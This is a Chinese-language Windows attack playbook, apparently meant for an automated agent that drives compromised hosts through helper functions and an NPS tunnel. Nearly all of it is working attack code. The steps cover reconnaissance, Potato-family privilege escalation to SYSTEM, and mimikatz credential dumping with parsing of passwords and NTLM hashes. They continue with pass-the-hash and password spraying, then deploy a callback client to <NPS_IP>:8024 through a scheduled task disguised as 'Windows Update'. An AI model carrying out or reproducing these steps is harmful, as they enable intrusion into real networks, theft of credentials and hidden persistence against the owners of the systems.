# Windows 攻击参考

## 1. 信息收集

### 1.1 系统信息

```python
# 一键收集 Windows 系统信息
commands = [
    "systeminfo",
    "whoami /all",
    "ipconfig /all",
    "net user",
    "net localgroup administrators",
    "netstat -ano",
    "arp -a",
    "route print",
    "nltest /dclist: 2>nul",
    'wmic qfe list brief | findstr /i "KB"',
    "cmdkey /list"
]
for cmd in commands:
    print(f"\n{'='*60}\n[*] {cmd}\n{'='*60}")
    print(exec_cmd(cid, cmd))
```

关键解析点：
- `systeminfo` → OS版本、补丁级别（匹配内核CVE）、域信息
- `whoami /all` → 当前用户权限和特权（决定提权路径）
- `ipconfig /all` → 多网卡=跳板候选、DNS指向域控
- `nltest /dclist:` → 域控地址
- `cmdkey /list` → 缓存的远程凭据

---

## 2. 提权

### 2.1 权限检查与提权路径选择

```python
privs = exec_cmd(cid, "whoami /priv")
print(privs)
```

| 特权 | 提权方法 | 工具 |
|------|----------|------|
| SeImpersonatePrivilege | Potato 系列 | GodPotato / PrintSpoofer / SweetPotato |
| SeDebugPrivilege | 进程注入 | 直接注入 SYSTEM 进程 |
| SeBackupPrivilege | SAM 数据库复制 | reg save 导出 SAM/SYSTEM |
| SeRestorePrivilege | 文件替换 | 替换系统文件 |
| SeAssignPrimaryTokenPrivilege | Token 操作 | Potato 系列 |
| SeTcbPrivilege | 极高权限 | 几乎等于 SYSTEM |

### 2.2 Potato 系列提权

**GodPotato**（首选，兼容性最广，支持 .NET 4.x）：
```python
# GodPotato 提权到 SYSTEM
push_tool(cid, "GodPotato/GodPotato-NET4.exe", "C:\\temp")
# 以 SYSTEM 执行命令
result = exec_cmd(cid, 'C:\\temp\\GodPotato-NET4.exe -cmd "whoami"')
print(result)  # 应返回 nt authority\system

# 以 SYSTEM 上线 NPS
exec_cmd(cid, 'C:\\temp\\GodPotato-NET4.exe -cmd "C:\\temp\\npc_windows_amd64.exe -server=<NPS_IP>:8024 -vkey=auto"')
```

**PrintSpoofer**（需要 SeImpersonate + Print Spooler 服务运行）：
```python
push_tool(cid, "PrintSpoofer/PrintSpoofer64.exe", "C:\\temp")
exec_cmd(cid, 'C:\\temp\\PrintSpoofer64.exe -i -c "whoami"')
```

**SweetPotato**（综合 Potato，多种触发方式）：
```python
push_tool(cid, "SweetPotato/SweetPotato.exe", "C:\\temp")
exec_cmd(cid, 'C:\\temp\\SweetPotato.exe -a "whoami"')
```

选择顺序：GodPotato → PrintSpoofer → SweetPotato。如果一个失败尝试下一个。

## 3. 凭据收集

### 3.1 Mimikatz

```python
# 方式1：直接执行 mimikatz
push_tool(cid, "mimikatz/mimikatz_x64.exe", "C:\\temp")
result = exec_cmd(cid, 'C:\\temp\\mimikatz_x64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"')
print(result)

# 解析凭据
import re
creds = re.findall(r'Username\s*:\s*(\S+).*?Domain\s*:\s*(\S+).*?(?:Password\s*:\s*(\S+)|NTLM\s*:\s*([a-f0-9]{32}))', result, re.DOTALL)
for c in creds:
    user, domain, pwd, ntlm = c
    if pwd and pwd != "(null)":
        print(f"[+] 密码: {domain}\\{user} : {pwd}")
    if ntlm:
        print(f"[+] NTLM: {domain}\\{user} : {ntlm}")
```

---

## 4. 横向移动

### 4.1 Pass-the-Hash (PTH)

```python
# mimikatz PTH（以目标用户身份执行命令）
exec_cmd(cid, 'C:\\temp\\mimikatz_x64.exe "sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:cmd.exe" "exit"')
```

对于 impacket 工具（secretsdump/psexec/wmiexec），需通过 SOCKS5 代理：
```python
# ============================================================
# 使用 impacket 进行 PTH 横向需要 SOCKS5 代理
# 请使用 nps-operator skill：
#   "在客户端 {cid} 上创建 SOCKS5 代理，端口 {port}"
# 然后本地使用：
#   proxychains psexec.py -hashes :{ntlm} {domain}/{user}@{target}
#   proxychains wmiexec.py -hashes :{ntlm} {domain}/{user}@{target}
#   proxychains secretsdump.py -hashes :{ntlm} {domain}/{user}@{target}
# ============================================================
```

### 4.2 密码/Hash 批量复用

```python
# fscan 批量密码复用
exec_cmd(cid, 'echo {password} > C:\\temp\\pwd.txt')
exec_cmd(cid, 'C:\\temp\\fscan_windows_amd64.exe -h {target_segment} -m smb -pwdf C:\\temp\\pwd.txt -userf C:\\temp\\user.txt -o C:\\temp\\smb_result.txt')
result = exec_cmd(cid, 'type C:\\temp\\smb_result.txt')
```

### 4.3 远程执行方式对比

| 方式 | 端口 | 需要凭据 | 痕迹 | 特点 |
|------|------|----------|-------|------|
| PsExec | 445 | 密码/hash | 低(创建服务,留日志) | 交互式/非交互式 |
| WMI | 135 | 密码/hash | 中 | 无文件写入 |

### 4.4 新主机 NPS 上线

获取新主机权限后，优先让其上线 NPS：

```python
# Windows：通过已控主机远程部署 npc
# 方式1：SMB 复制 + 计划任务
exec_cmd(cid, f'copy C:\\temp\\npc_windows_amd64.exe \\\\{target}\\C$\\temp\\npc.exe')
exec_cmd(cid, f'schtasks /create /s {target} /u {user} /p {password} /tn "Windows Update" /tr "C:\\temp\\npc.exe -server=<NPS_IP>:8024 -vkey=auto" /sc once /st 00:00 /ru SYSTEM')
exec_cmd(cid, f'schtasks /run /s {target} /u {user} /p {password} /tn "Windows Update"')

# 方式2：WMI 远程执行
exec_cmd(cid, f'wmic /node:{target} /user:{user} /password:{password} process call create "C:\\temp\\npc.exe -server=<NPS_IP>:8024 -vkey=auto"')
```
